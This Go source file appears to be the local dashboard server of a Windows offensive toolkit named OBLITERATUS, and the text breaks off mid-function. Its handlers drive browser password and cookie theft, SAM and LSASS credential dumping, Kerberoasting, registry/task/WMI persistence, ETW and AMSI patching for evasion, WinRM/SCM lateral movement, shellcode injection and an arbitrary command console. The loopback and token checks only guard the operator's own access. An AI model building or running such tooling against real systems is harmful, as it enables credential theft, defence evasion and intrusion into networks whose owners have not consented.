// Package server implements the local OBLITERATUS dashboard API.
//
// Security model (v2 rewrite — the v1 model had critical holes):
//
//   - Listener binds 127.0.0.1 only (v1 bound :8080 on every interface).
//   - Per-run 256-bit crypto/rand token (v1 derived it from the PID, and the
//     PID is visible to any local process; worse, the token was echoed to any
//     unauthenticated GET of "/").
//   - Every API route requires loopback Host + the token in a custom header,
//     which also defeats CSRF (cross-origin fetches with custom headers are
//     preflighted, and we never approve a preflight).
//   - State-changing routes are POST-only (ServeMux method patterns).
//   - WebSocket requires a loopback Origin AND the token (?t=).
//   - Offensive modules (credential collection, injection) answer 403 unless
//     the operator started with --enable-collect / --enable-inject.
package server

import (
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	"github.com/DevCop95/obliteratus/internal/audit"
	"github.com/DevCop95/obliteratus/internal/elevate"
	"github.com/DevCop95/obliteratus/internal/krb"
	"github.com/DevCop95/obliteratus/internal/lateral"
	"github.com/DevCop95/obliteratus/internal/persist"
	"github.com/DevCop95/obliteratus/internal/research"
	"github.com/DevCop95/obliteratus/internal/ui"
	"github.com/DevCop95/obliteratus/internal/winname"
	"github.com/DevCop95/obliteratus/internal/winutil"
)

// DefaultAddr is the loopback-only listen address.
const DefaultAddr = "127.0.0.1:8080"

// Config wires a Server.
type Config struct {
	// Token is the per-run API token (see token.New).
	Token string
	// Version is reported by /v1/sys/st and audit reports.
	Version string
	// Addr is the listen address; defaults to DefaultAddr. Loopback only is
	// enforced at Listen time.
	Addr string
	// EnableCollect unlocks the credential/cookie collectors.
	EnableCollect bool
	// EnablePersist unlocks the persistence manager (T1547 Run keys + Startup,
	// T1053.005 scheduled tasks, T1546.003 WMI subscriptions).
	EnablePersist bool
	// EnableEvasion unlocks the self-telemetry evasion module (ETW/AMSI patch).
	EnableEvasion bool
	// EnableLateral unlocks the lateral-movement module (WinRM + SCM execution).
	EnableLateral bool
	// EnableUnlock inject unlocks the indirect-syscall injection module.
	EnableInject bool
	// PayloadPath is the shellcode file used by the injection module.
	PayloadPath string
	// PayloadKey unpacks a packed payload (research.Pack) before injection;
	// empty means the payload is used verbatim.
	PayloadKey string
	// Elevated reflects the current token state (for status + audit reports).
	Elevated bool
}

// Server is the dashboard API.
type Server struct {
	cfg        Config
	token      string
	version    string
	addr       string
	connectSrc string
	hub        *hub
	mux        *http.ServeMux
}

// New builds a Server with all routes registered.
func New(cfg Config) *Server {
	if cfg.Addr == "" {
		cfg.Addr = DefaultAddr
	}
	if cfg.Token == "" {
		panic("server: Config.Token is required (generate with token.New())")
	}
	if cfg.PayloadPath == "" {
		cfg.PayloadPath = filepath.Join("payloads", "research_signal.bin")
	}
	s := &Server{
		cfg:     cfg,
		token:   cfg.Token,
		version: cfg.Version,
		addr:    cfg.Addr,
		// connect-src must name the exact ws:// endpoints the page may reach.
		connectSrc: wsOrigins(cfg.Addr),
		hub:        newHub(),
		mux:        http.NewServeMux(),
	}
	s.routes()
	return s
}

// wsOrigins renders the ws:// CSP entries for every loopback name, on the
// port this server actually listens on.
func wsOrigins(addr string) string {
	p := portOf(addr, "8080")
	return "ws://127.0.0.1:" + p + " ws://localhost:" + p + " ws://[::1]:" + p
}

func portOf(addr, fallback string) string {
	if _, p, err := net.SplitHostPort(addr); err == nil && p != "" {
		return p
	}
	return fallback
}

// routes registers every endpoint. Method patterns ("POST /path") make the
// ServeMux answer 405 automatically for wrong verbs — no handler ever has to
// remember to check.
func (s *Server) routes() {
	// --- pages (host-checked; token travels inside the page) ---------------
	s.mux.HandleFunc("GET /{$}", s.guardPage(s.handleIndex))
	s.mux.HandleFunc("GET /healthz", s.guardPage(s.handleHealth))
	s.mux.HandleFunc("GET /ws", s.handleWS)

	// --- read-only system API ------------------------------------------------
	s.mux.HandleFunc("GET /v1/sys/st", s.guard(s.handleStatus))
	s.mux.HandleFunc("GET /v1/sys/hex", s.guard(s.handleHex))
	s.mux.HandleFunc("GET /v1/sys/b2", s.guard(s.handleProcesses))

	// --- state-changing system API ------------------------------------------
	s.mux.HandleFunc("POST /v1/sys/cmd", s.guard(s.handleCommand))
	s.mux.HandleFunc("POST /v1/sys/opt", s.guard(s.handleTweaks))

	// --- authorised collection module (--enable-collect) ---------------------
	s.mux.HandleFunc("GET /v1/sys/a7", s.guard(s.handlePasswords))
	s.mux.HandleFunc("GET /v1/sys/cookies", s.guard(s.handleCookies))
	s.mux.HandleFunc("GET /v1/sys/nexus", s.guard(s.handleNexus))
	s.mux.HandleFunc("POST /v1/op/a7", s.guard(s.handlePasswordsStream))
	s.mux.HandleFunc("POST /v1/op/cookies", s.guard(s.handleCookiesStream))
	s.mux.HandleFunc("POST /v1/sys/sam", s.guard(s.handleSAMStream))
	s.mux.HandleFunc("POST /v1/op/roast-asrep", s.guard(s.handleRoastASREP))
	s.mux.HandleFunc("POST /v1/op/roast-tgs", s.guard(s.handleRoastTGS))
	s.mux.HandleFunc("POST /v1/op/spn-enum", s.guard(s.handleSPNEnum))
	s.mux.HandleFunc("POST /v1/op/lsass", s.guard(s.handleLSASS))
	s.mux.HandleFunc("POST /v1/op/lsass-wipe", s.guard(s.handleLSASSWipe))

	// --- persistence module (--enable-persist) --------------------------------
	s.mux.HandleFunc("GET /v1/sys/persist", s.guard(s.handlePersistList))
	s.mux.HandleFunc("POST /v1/op/persist-add", s.guard(s.handlePersistAdd))
	s.mux.HandleFunc("POST /v1/op/persist-del", s.guard(s.handlePersistDel))

	// --- self-evasion module (--enable-evasion) -------------------------------
	s.mux.HandleFunc("POST /v1/op/etw", s.guard(s.handleETW))
	s.mux.HandleFunc("POST /v1/op/amsi", s.guard(s.handleAMSI))

	// --- lateral movement module (--enable-lateral) ---------------------------
	s.mux.HandleFunc("POST /v1/op/lateral-winrm", s.guard(s.handleLateralWinRM))
	s.mux.HandleFunc("POST /v1/op/lateral-scm", s.guard(s.handleLateralSCM))

	// --- authorised injection module (--enable-inject) -----------------------
	s.mux.HandleFunc("POST /v1/op/d4", s.guard(s.handleInject))

	// --- defensive audit (always available) ----------------------------------
	s.mux.HandleFunc("POST /v1/audit/report", s.guard(s.handleAuditReport))
	s.mux.HandleFunc("POST /v1/audit/csv", s.guard(s.handleAuditCSV))
}

// Handler returns the full middleware-wrapped handler.
func (s *Server) Handler() http.Handler { return s.mux }

// ListenAndServe starts the loopback listener. It refuses to bind anything
// that is not a loopback address: a dashboard with a console endpoint must
// never be reachable from the network.
func (s *Server) ListenAndServe() error {
	if !isLoopbackAddr(s.addr) {
		return fmt.Errorf("server: refusing to bind non-loopback address %q (console + collectors are local-only by design)", s.addr)
	}
	ln, err := net.Listen("tcp", s.addr)
	if err != nil {
		return err
	}
	log.Printf("[+] dashboard: http://%s/ (loopback only, token %s…)", s.addr, short(s.token))
	srv := &http.Server{
		Handler:           s.mux,
		ReadHeaderTimeout: 10 * time.Second,
		// Idle/Write timeouts are deliberately generous: WebSocket streams and
		// large audit responses would be cut off by a short WriteTimeout.
	}
	return srv.Serve(ln)
}

// isLoopbackAddr reports whether addr starts with a loopback IP or name.
func isLoopbackAddr(addr string) bool {
	host, _, err := net.SplitHostPort(addr)
	if err != nil {
		host = addr
	}
	host = strings.Trim(host, "[]")
	if loopbackHosts[host] {
		return true
	}
	if ip := net.ParseIP(host); ip != nil {
		return ip.IsLoopback()
	}
	return false
}

func short(tok string) string {
	if len(tok) > 8 {
		return tok[:8]
	}
	return tok
}

// ---------------------------------------------------------------------------
// handlers — pages
// ---------------------------------------------------------------------------

func (s *Server) handleIndex(w http.ResponseWriter, r *http.Request) {
	// The dashboard HTML with this run's token injected (same-origin only —
	// see ui.Render for the threat-model note).
	_, _ = w.Write([]byte(ui.Render(s.token)))
}

func (s *Server) handleHealth(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/plain")
	_, _ = w.Write([]byte("ok"))
}

// ---------------------------------------------------------------------------
// handlers — system
// ---------------------------------------------------------------------------

func (s *Server) handleStatus(w http.ResponseWriter, r *http.Request) {
	status := "USER"
	if elevate.IsAdmin() {
		status = "ADMIN"
	}
	w.Header().Set("Content-Type", "text/plain")
	_, _ = w.Write([]byte(status))
}

func (s *Server) handleHex(w http.ResponseWriter, r *http.Request) {
	// First bytes of the payload file, hex-encoded, for the hex viewer.
	b, err := os.ReadFile(s.cfg.PayloadPath)
	if err != nil || len(b) == 0 {
		w.Header().Set("Content-Type", "text/plain")
		_, _ = w.Write([]byte(""))
		return
	}
	if len(b) > 256 {
		b = b[:256]
	}
	w.Header().Set("Content-Type", "text/plain")
	_, _ = w.Write([]byte(fmt.Sprintf("%02x", b)))
}

func (s *Server) handleProcesses(w http.ResponseWriter, r *http.Request) {
	sendJSON(w, http.StatusOK, winutil.Processes())
}

// handleCommand is the operator console. Arbitrary command execution is the
// point of the module — which is exactly why it sits behind loopback Host +
// per-run token + POST-only + custom header (see package docs).
func (s *Server) handleCommand(w http.ResponseWriter, r *http.Request) {
	var req struct {
		C string `json:"c"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || strings.TrimSpace(req.C) == "" {
		http.Error(w, "bad request: {\"c\":\"command\"}", http.StatusBadRequest)
		return
	}
	s.logLine("RUN: "+req.C, "INFO")
	out, err := runShell(req.C)
	if err != nil && len(out) == 0 {
		http.Error(w, "execution failed: "+err.Error(), http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "text/plain; charset=utf-8")
	_, _ = w.Write(out)
}

func (s *Server) handleTweaks(w http.ResponseWriter, r *http.Request) {
	sendJSON(w, http.StatusOK, winutil.ApplyTelemetryTweaks())
}

// ---------------------------------------------------------------------------
// handlers — authorised collection module
// ---------------------------------------------------------------------------

// requireModule fails closed with an actionable JSON error when a gated
// module is disabled.
func (s *Server) requireModule(w http.ResponseWriter, enabled bool, name, flag string) bool {
	if enabled {
		return true
	}
	sendJSON(w, http.StatusForbidden, map[string]string{
		"error": name + " module disabled",
		"hint":  "restart obliteratus with " + flag + " if this is part of an authorised engagement",
	})
	return false
}

func (s *Server) handlePasswords(w http.ResponseWriter, r *http.Request) {
	if !s.requireModule(w, s.cfg.EnableCollect, "credential collection", "--enable-collect") {
		return
	}
	entries := audit.CollectCredentials(audit.SupportedChromiumBrowsers, s.logEmitter())
	sendJSON(w, http.StatusOK, entries)
}

func (s *Server) handleCookies(w http.ResponseWriter, r *http.Request) {
	if !s.requireModule(w, s.cfg.EnableCollect, "cookie collection", "--enable-collect") {
		return
	}
	cookies := audit.CollectCookies(audit.SupportedChromiumBrowsers, s.logEmitter())
	sendJSON(w, http.StatusOK, cookies)
}

func (s *Server) handleNexus(w http.ResponseWriter, r *http.Request) {
	if !s.requireModule(w, s.cfg.EnableCollect, "identity nexus", "--enable-collect") {
		return
	}
	sendJSON(w, http.StatusOK, audit.Nexus(s.logEmitter()))
}

// handlePasswordsStream streams credentials per browser over the WebSocket,
// preserving the v1 chunk protocol the dashboard already understands
// (a7_chunk → a7_done).
func (s *Server) handlePasswordsStream(w http.ResponseWriter, r *http.Request) {
	if !s.requireModule(w, s.cfg.EnableCollect, "credential collection", "--enable-collect") {
		return
	}
	go func() {
		for _, browser := range audit.SupportedChromiumBrowsers {
			entries := audit.CollectCredentials([]string{browser}, s.logEmitter())
			if len(entries) > 0 {
				s.hub.broadcastJSON(map[string]interface{}{
					"type":    "a7_chunk",
					"browser": browser,
					"entries": entries,
				})
			}
		}
		s.hub.broadcastJSON(map[string]interface{}{"type": "a7_done"})
	}()
	w.Header().Set("Content-Type", "text/plain")
	_, _ = w.Write([]byte("OK"))
}

func (s *Server) handleCookiesStream(w http.ResponseWriter, r *http.Request) {
	if !s.requireModule(w, s.cfg.EnableCollect, "cookie collection", "--enable-collect") {
		return
	}
	go func() {
		for _, browser := range audit.SupportedChromiumBrowsers {
			cookies := audit.CollectCookies([]string{browser}, s.logEmitter())
			if len(cookies) > 0 {
				s.hub.broadcastJSON(map[string]interface{}{
					"type":    "cookies_chunk",
					"browser": browser,
					"entries": cookies,
				})
			}
		}
		s.hub.broadcastJSON(map[string]interface{}{"type": "cookies_done"})
	}()
	w.Header().Set("Content-Type", "text/plain")
	_, _ = w.Write([]byte("OK"))
}

// handleSAMStream runs the lsadump::sam module and streams the recovered
// accounts over the WebSocket (sam_chunk → sam_done), mirroring the browser
// collector protocol. Gated behind --enable-collect; the hive export itself
// (`reg save`) additionally requires an elevated token, so a non-admin run
// fails closed with an actionable hint instead of a generic 500.
func (s *Server) handleSAMStream(w http.ResponseWriter, r *http.Request) {
	if !s.requireModule(w, s.cfg.EnableCollect, "SAM hash dump", "--enable-collect") {
		return
	}
	if !elevate.IsAdmin() {
		sendJSON(w, http.StatusForbidden, map[string]string{
			"error": "SAM dump requires an elevated token",
			"hint":  "restart obliteratus with --elevate (reg save needs backup privileges)",
		})
		return
	}
	go func() {
		accounts, err := audit.DumpSAM(s.logEmitter())
		if err != nil {
			s.logLine("SAM_FAIL: "+err.Error(), "ERROR")
		}
		if len(accounts) > 0 {
			s.hub.broadcastJSON(map[string]interface{}{
				"type":    "sam_chunk",
				"entries": accounts,
			})
		}
		s.hub.broadcastJSON(map[string]interface{}{"type": "sam_done"})
	}()
	w.Header().Set("Content-Type", "text/plain")
	_, _ = w.Write([]byte("OK"))
}

// logEmitter adapts the audit progress callbacks to the console broadcast.
func (s *Server) logEmitter() audit.Emitter {
	return func(msg, level string) {
		s.logLine(msg, level)
	}
}

// krbEmitter adapts the krb progress callbacks to the console broadcast.
func (s *Server) krbEmitter() krb.Emitter {
	return func(msg, level string) {
		s.logLine(msg, level)
	}
}

// ---------------------------------------------------------------------------
// handlers — kerberoast module (T1558.003 / T1558.004)
// ---------------------------------------------------------------------------

// handleRoastASREP probes one pre-auth-free AS-REQ and streams the
// hashcat-mode-18200 blob over the WebSocket when the KDC answers.
// Gated behind --enable-collect (credential access).
func (s *Server) handleRoastASREP(w http.ResponseWriter, r *http.Request) {
	if !s.requireModule(w, s.cfg.EnableCollect, "kerberos roasting", "--enable-collect") {
		return
	}
	var req struct {
		User   string `json:"user"`
		Domain string `json:"domain"`
		KDC    string `json:"kdc"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil ||
		strings.TrimSpace(req.User) == "" || strings.TrimSpace(req.Domain) == "" {
		http.Error(w, "bad request: {\"user\":\"svc\",\"domain\":\"corp.local\"}", http.StatusBadRequest)
		return
	}
	kdc, err := s.resolveKDC(req.KDC, req.Domain)
	if err != nil {
		http.Error(w, err.Error(), http.StatusUnprocessableEntity)
		return
	}
	go func() {
		h, err := krb.ASREPRoast(kdc, req.Domain, req.User, s.krbEmitter())
		if err != nil {
			s.logLine("ROAST_FAIL: "+err.Error(), "ERROR")
			return
		}
		s.hub.broadcastJSON(map[string]interface{}{
			"type": "roast_hash", "kind": "asrep",
			"user": h.User, "hash": h.Hash,
		})
		s.hub.broadcastJSON(map[string]interface{}{"type": "roast_done"})
	}()
	w.Header().Set("Content-Type", "text/plain")
	_, _ = w.Write([]byte("OK"))
}

// handleRoastTGS requests a TGT and one TGS per SPN, streaming the
// hashcat-mode-13100 blobs. Only NT hashes are accepted — cleartext
// passwords are never a parameter of this API.
func (s *Server) handleRoastTGS(w http.ResponseWriter, r *http.Request) {
	if !s.requireModule(w, s.cfg.EnableCollect, "kerberos roasting", "--enable-collect") {
		return
	}
	var req struct {
		User   string   `json:"user"`
		Domain string   `json:"domain"`
		Hash   string   `json:"hash"`
		SPNs   []string `json:"spns"`
		KDC    string   `json:"kdc"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil ||
		strings.TrimSpace(req.User) == "" || strings.TrimSpace(req.Domain) == "" ||
		strings.TrimSpace(req.Hash) == "" || len(req.SPNs) == 0 {
		http.Error(w, "bad request: {\"user\",\"domain\",\"hash\",\"spns\":[...]}", http.StatusBadRequest)
		return
	}
	kdc, err := s.resolveKDC(req.KDC, req.Domain)
	if err != nil {
		http.Error(w, err.Error(), http.StatusUnprocessableEntity)
		return
	}
	go func() {
		hashes, err := krb.TGSRoast(kdc, req.Domain, req.User, req.Hash, req.SPNs, s.krbEmitter())
		if err != nil {
			s.logLine("ROAST_FAIL: "+err.Error(), "ERROR")
		}
		for _, h := range hashes {
			s.hub.broadcastJSON(map[string]interface{}{
				"type": "roast_hash", "kind": "tgs",
				"user": h.User, "spn": h.SPN, "hash": h.Hash,
			})
		}
		s.hub.broadcastJSON(map[string]interface{}{"type": "roast_done"})
	}()
	w.Header().Set("Content-Type", "text/plain")
	_, _ = w.Write([]byte("OK"))
}

// handleSPNEnum runs the LDAP SPN enumeration for the TGS roaster.
func (s *Server) handleSPNEnum(w http.ResponseWriter, r *http.Request) {
	if !s.requireModule(w, s.cfg.EnableCollect, "kerberos roasting", "--enable-collect") {
		return
	}
	var req struct {
		Host     string `json:"host"`
		Domain   string `json:"domain"`
		User     string `json:"user"`
		Password string `json:"password"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil ||
		strings.TrimSpace(req.Domain) == "" || strings.TrimSpace(req.User) == "" {
		http.Error(w, "bad request: {\"domain\",\"user\",...}", http.StatusBadRequest)
		return
	}
	host := strings.TrimSpace(req.Host)
	if host == "" {
		kdc, err := s.resolveKDC("", req.Domain)
		if err != nil {
			http.Error(w, err.Error(), http.StatusUnprocessableEntity)
			return
		}
		host, _, _ = net.SplitHostPort(kdc)
	}
	go func() {
		spns, err := krb.EnumSPNs(host, req.Domain, req.User, req.Password, s.krbEmitter())
		if err != nil {
			s.logLine("LDAP_FAIL: "+err.Error(), "ERROR")
			return
		}
		s.hub.broadcastJSON(map[string]interface{}{
			"type": "spn_list", "entries": spns,
		})
	}()
	w.Header().Set("Content-Type", "text/plain")
	_, _ = w.Write([]byte("OK"))
}

// resolveKDC returns an explicit KDC or discovers one via DNS SRV.
func (s *Server) resolveKDC(explicit, domain string) (string, error) {
	if k := strings.TrimSpace(explicit); k != "" {
		if _, _, err := net.SplitHostPort(k); err != nil {
			return net.JoinHostPort(k, "88"), nil
		}
		return k, nil
	}
	return krb.FindKDC(domain)
}

// ---------------------------------------------------------------------------
// handlers — LSASS memory acquisition (T1003.001)
// ---------------------------------------------------------------------------

// handleLSASS dumps the given PID to a file and reports the path. Gated
// behind --enable-collect; elevation plus SeDebugPrivilege stay mandatory
// and PPL-protected LSASS fails closed inside DumpLSASS itself.
func (s *Server) handleLSASS(w http.ResponseWriter, r *http.Request) {
	if !s.requireModule(w, s.cfg.EnableCollect, "LSASS acquisition", "--enable-collect") {
		return
	}
	if !elevate.IsAdmin() {
		sendJSON(w, http.StatusForbidden, map[string]string{
			"error": "LSASS dump requires an elevated token",
			"hint":  "restart obliteratus with --elevate",
		})
		return
	}
	var req struct {
		PID int `json:"pid"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.PID <= 0 {
		http.Error(w, "bad request: {\"pid\":1234}", http.StatusBadRequest)
		return
	}
	go func() {
		path, size, err := audit.DumpLSASS(req.PID, "", s.logEmitter())
		if err != nil {
			s.logLine("LSASS_FAIL: "+err.Error(), "ERROR")
			return
		}
		s.hub.broadcastJSON(map[string]interface{}{
			"type": "lsass_done", "path": path, "size": size,
		})
	}()
	w.Header().Set("Content-Type", "text/plain")
	_, _ = w.Write([]byte("OK"))
}

// lsassDumpName matches the filenames audit.DumpLSASS writes:
// obl-lsass-<pid>-<YYYYMMDD-HHMMSS>.dmp
var lsassDumpName = regexp.MustCompile(`^obl-lsass-\d+-\d{8}-\d{6}\.dmp$`)

// validLSASSDumpPath reports whether p is a dump this tool wrote: an
// obl-lsass-*.dmp directly inside the temp directory, and not a reparse point
// (so it cannot redirect the wipe outside the temp directory). It confines the
// wipe endpoint, which is otherwise an arbitrary truncate-and-delete primitive.
func validLSASSDumpPath(p string) bool {
	clean := filepath.Clean(p)
	if !lsassDumpName.MatchString(filepath.Base(clean)) {
		return false
	}
	if !strings.EqualFold(filepath.Dir(clean), filepath.Clean(os.TempDir())) {
		return false
	}
	fi, err := os.Lstat(clean)
	if err != nil || fi.Mode()&os.ModeSymlink != 0 {
		return false
	}
	return true
}

// handleLSASSWipe removes a dump file after the operator pulled it.
func (s *Server) handleLSASSWipe(w http.ResponseWriter, r *http.Request) {
	if !s.requireModule(w, s.cfg.EnableCollect, "LSASS acquisition", "--enable-collect") {
		return
	}
	var req struct {
		Path string `json:"path"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || strings.TrimSpace(req.Path) == "" {
		http.Error(w, "bad request: {\"path\":\"C:\\\\...\\\\obl-lsass-123.dmp\"}", http.StatusBadRequest)
		return
	}
	// Confine the wipe to a dump this tool actually wrote: an obliteratus LSASS
	// dump in the temp directory. Without this the endpoint is an arbitrary
	// truncate-and-delete primitive for the token holder.
	if !validLSASSDumpPath(req.Path) {
		http.Error(w, "refusing to wipe: not an obliteratus LSASS dump in the temp directory", http.StatusUnprocessableEntity)
		return
	}
	if err := audit.WipeFile(req.Path); err != nil {
		s.logLine("LSASS_WIPE_FAIL: "+err.Error(), "ERROR")
		http.Error(w, err.Error(), http.StatusUnprocessableEntity)
		return
	}
	s.logLine("LSASS: dump wiped", "SUCCESS")
	w.Header().Set("Content-Type", "text/plain")
	_, _ = w.Write([]byte("OK"))
}

// ---------------------------------------------------------------------------
// handlers — persistence module (T1547 / T1053.005 / T1546.003)
// ---------------------------------------------------------------------------

func (s *Server) handlePersistList(w http.ResponseWriter, r *http.Request) {
	if !s.requireModule(w, s.cfg.EnablePersist, "persistence", "--enable-persist") {
		return
	}
	entries, err := persist.List()
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	if entries == nil {
		entries = []persist.Entry{}
	}
	sendJSON(w, http.StatusOK, entries)
}

func (s *Server) handlePersistAdd(w http.ResponseWriter, r *http.Request) {
	if !s.requireModule(w, s.cfg.EnablePersist, "persistence", "--enable-persist") {
		return
	}
	var spec persist.Spec
	if err := json.NewDecoder(r.Body).Decode(&spec); err != nil {
		http.Error(w, `bad request: {"type":"run|startup|task|wmi","hive":"HKCU","name":"x","cmd":"y"}`, http.StatusBadRequest)
		return
	}
	if err := persist.Add(spec); err != nil {
		s.logLine("PERSIST_FAIL: "+err.Error(), "ERROR")
		http.Error(w, err.Error(), http.StatusUnprocessableEntity)
		return
	}
	s.logLine(fmt.Sprintf("PERSIST: added %s %q", spec.Type, spec.Name), "SUCCESS")
	w.Header().Set("Content-Type", "text/plain")
	_, _ = w.Write([]byte("OK"))
}

func (s *Server) handlePersistDel(w http.ResponseWriter, r *http.Request) {
	if !s.requireModule(w, s.cfg.EnablePersist, "persistence", "--enable-persist") {
		return
	}
	var spec persist.Spec
	if err := json.NewDecoder(r.Body).Decode(&spec); err != nil {
		http.Error(w, `bad request: {"type":"run|startup|task|wmi","hive":"HKCU","name":"x"}`, http.StatusBadRequest)
		return
	}
	if err := persist.Remove(spec); err != nil {
		s.logLine("PERSIST_FAIL: "+err.Error(), "ERROR")
		http.Error(w, err.Error(), http.StatusUnprocessableEntity)
		return
	}
	s.logLine(fmt.Sprintf("PERSIST: removed %s %q", spec.Type, spec.Name), "SUCCESS")
	w.Header().Set("Content-Type", "text/plain")
	_, _ = w.Write([]byte("OK"))
}

// ---------------------------------------------------------------------------
// handlers — self-evasion module
// ---------------------------------------------------------------------------

// handleETW neuters ntdll!EtwEventWrite in the tool's own process (W^X-safe
// transition). Gated behind --enable-evasion; the effect is logged, never
// silent — hiding blindly is how operators get surprised.
func (s *Server) handleETW(w http.ResponseWriter, r *http.Request) {
	if !s.requireModule(w, s.cfg.EnableEvasion, "evasion", "--enable-evasion") {
		return
	}
	addr, err := research.PatchETW()
	if err != nil {
		s.logLine("ETW_FAIL: "+err.Error(), "ERROR")
		http.Error(w, err.Error(), http.StatusUnprocessableEntity)
		return
	}
	s.logLine(fmt.Sprintf("ETW: %s neutered at 0x%x (this process)", winname.EtwWrite, addr), "SUCCESS")
	w.Header().Set("Content-Type", "text/plain")
	_, _ = w.Write([]byte("OK"))
}

// handleAMSI neuters amsi.dll!AmsiScanBuffer in the tool's own process (W^X-safe
// transition). Gated behind --enable-evasion; logged, never silent.
func (s *Server) handleAMSI(w http.ResponseWriter, r *http.Request) {
	if !s.requireModule(w, s.cfg.EnableEvasion, "evasion", "--enable-evasion") {
		return
	}
	addr, err := research.PatchAMSI()
	if err != nil {
		s.logLine("AMSI_FAIL: "+err.Error(), "ERROR")
		http.Error(w, err.Error(), http.StatusUnprocessableEntity)
		return
	}
	s.logLine(fmt.Sprintf("AMSI: %s neutered at 0x%x (this process)", winname.AmsiScan, addr), "SUCCESS")
	w.Header().Set("Content-Type", "text/plain")
	_, _ = w.Write([]byte("OK"))
}

// ---------------------------------------------------------------------------
// handlers — lateral movement (WinRM T1021.006 / SCM T1021.002)
// ---------------------------------------------------------------------------

// lateralEmitter adapts the lateral progress callbacks to the console.
func (s *Server) lateralEmitter() lateral.Emitter {
	return func(msg, level string) {
		s.logLine(msg, level)
	}
}

// handleLateralWinRM runs a command on a remote host over WS-Management.
// Gated behind --enable-lateral; credentials come from the operator.
func (s *Server) handleLateralWinRM(w http.ResponseWriter, r *http.Request) {
	if !s.requireModule(w, s.cfg.EnableLateral, "lateral movement", "--enable-lateral") {
		return
	}
	var req struct {
		Host     string `json:"host"`
		User     string `json:"user"`
		Password string `json:"password"`
		Command  string `json:"command"`
		TLS      bool   `json:"tls"`
		Insecure bool   `json:"insecure"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil ||
		strings.TrimSpace(req.Host) == "" || strings.TrimSpace(req.Command) == "" {
		http.Error(w, `bad request: {"host":"10.0.0.5","user":"CORP\\svc","password":"…","command":"whoami"}`, http.StatusBadRequest)
		return
	}
	opts := lateral.WinRMOpts{
		Host: req.Host, User: req.User, Password: req.Password,
		UseTLS: req.TLS, Insecure: req.Insecure,
	}
	go func() {
		out, err := lateral.WinRMExec(opts, req.Command, s.lateralEmitter())
		if err != nil {
			s.logLine("LATERAL_FAIL: "+err.Error(), "ERROR")
			s.hub.broadcastJSON(map[string]interface{}{"type": "lateral_done", "method": "winrm", "host": req.Host, "error": err.Error()})
			return
		}
		s.hub.broadcastJSON(map[string]interface{}{
			"type": "lateral_done", "method": "winrm", "host": req.Host, "output": out,
		})
	}()
	w.Header().Set("Content-Type", "text/plain")
	_, _ = w.Write([]byte("OK"))
}

// handleLateralSCM executes a command on a remote host by creating and starting
// a service on its Service Control Manager. Gated behind --enable-lateral.
func (s *Server) handleLateralSCM(w http.ResponseWriter, r *http.Request) {
	if !s.requireModule(w, s.cfg.EnableLateral, "lateral movement", "--enable-lateral") {
		return
	}
	var req struct {
		Host     string `json:"host"`
		User     string `json:"user"`
		Password string `json:"password"`
		Name     string `json:"name"`
		Command  string `json:"command"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil ||
		strings.TrimSpace(req.Host) == "" || strings.TrimSpace(req.Command) == "" {
		http.Error(w, `bad request: {"host":"10.0.0.5","user":"CORP\\svc","password":"…","name":"OblSvc","command":"whoami"}`, http.StatusBadRequest)
		return
	}
	go func() {
		err := lateral.SCMExec(req.Host, lateral.Creds{User: req.User, Password: req.Password}, req.Name, req.Command, s.lateralEmitter())
		if err != nil {
			s.logLine("LATERAL_FAIL: "+err.Error(), "ERROR")
			s.hub.broadcastJSON(map[string]interface{}{"type": "lateral_done", "method": "scm", "host": req.Host, "error": err.Error()})
			return
		}
		s.hub.broadcastJSON(map[string]interface{}{
			"type": "lateral_done", "method": "scm", "host": req.Host,
			"output": "service created, started and removed (output not captured — services have no console)",
		})
	}()
	w.Header().Set("Content-Type", "text/plain")
	_, _ = w.Write([]byte("OK"))
}

// ---------------------------------------------------------------------------
// handlers — authorised injection module
// ---------------------------------------------------------------------------

// handleInject runs the Halo's Gate W^X injection routine against an
// operator-selected PID on this machine. Gated behind --enable-inject.
func (s *Server) handleInject(w http.ResponseWriter, r *http.Request) {
	if !s.requireModule(w, s.cfg.EnableInject, "injection research", "--enable-inject") {
		return
	}
	var req struct {
		PID int `json:"pid"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.PID <= 0 {
		http.Error(w, "bad request: {\"pid\":1234}", http.StatusBadRequest)
		return
	}
	payload, err := os.ReadFile(s.cfg.PayloadPath)
	if err != nil {
		http.Error(w, "payload not found: "+s.cfg.PayloadPath, http.StatusNotFound)
		return
	}
	if research.IsPacked(payload) {
		if s.cfg.PayloadKey == "" {
			http.Error(w, "payload is packed but --payload-key is unset", http.StatusUnprocessableEntity)
			return
		}
		plain, err := research.Unpack(research.DeriveKey(s.cfg.PayloadKey), payload)
		if err != nil {
			s.logLine("INJECT_FAIL: unpack: "+err.Error(), "ERROR")
			http.Error(w, "unpack failed: "+err.Error(), http.StatusUnprocessableEntity)
			return
		}
		payload = plain
		s.logLine("INJECT: payload unpacked in memory", "INFO")
	}
	if err := research.Inject(req.PID, payload); err != nil {
		s.logLine("INJECT_FAIL: "+err.Error(), "ERROR")
		http.Error(w, err.Error(), http.StatusUnprocessableEntity)
		return
	}
	s.logLine("PULSE_SENT", "SUCCESS")
	w.Header().Set("Content-Type", "text/plain")
	_, _ = w.Write([]byte("OK"))
}

// ---------------------------------------------------------------------------
// handlers — defensive audit
// ---------------------------------------------------------------------------

func (s *Server) handleAuditReport(w http.ResponseWriter, r *http.Request) {
	modules := map[string]bool{
		"collect": s.cfg.EnableCollect,
		"inject":  s.cfg.EnableInject,
		"console": true,
	}
	rep := audit.BuildReport(s.version, s.cfg.Elevated, modules)
	sendJSON(w, http.StatusOK, rep)
}

func (s *Server) handleAuditCSV(w http.ResponseWriter, r *http.Request) {
	modules := map[string]bool{
		"collect": s.cfg.EnableCollect,
